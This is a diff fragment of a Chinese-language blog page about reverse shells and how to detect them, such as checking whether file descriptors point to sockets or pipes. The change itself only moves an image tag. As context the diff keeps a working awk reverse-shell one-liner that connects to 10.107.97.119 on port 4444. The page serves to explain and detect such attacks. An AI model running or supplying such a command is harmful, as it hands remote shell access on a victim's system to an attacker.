@@ -244,7 +244,8 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">awk 'BEGIN&#123;s="/inet/tcp/0/10.107.97.119/4444";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;'</span></pre></td></tr></table></figure>
 
 <h1 id="shell检测"><a href="#shell检测" class="headerlink" title="shell检测"></a>shell检测</h1><h2 id="bash反弹shell检测"><a href="#bash反弹shell检测" class="headerlink" title="bash反弹shell检测"></a>bash反弹shell检测</h2><p><strong>检测 file descriptor 是否指向一个socket:</strong></p>
-<p>以<code>“重定向符”+&quot;/dev/tcp</code>网络通信”Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个socket句柄</strong><img src="/images/a13/20.png" alt="img"></p>
+<p>以<code>“重定向符”+&quot;/dev/tcp</code>网络通信”Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个socket句柄</strong></p>
+<p><img src="/images/a13/20.png" alt="img"></p>
 <p><img src="/images/a13/21.png" alt="img"></p>
 <p><strong>检测 file descriptor 是否指向一个管道符（pipe）:</strong></p>
 <p>对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个pipe句柄</strong></p>
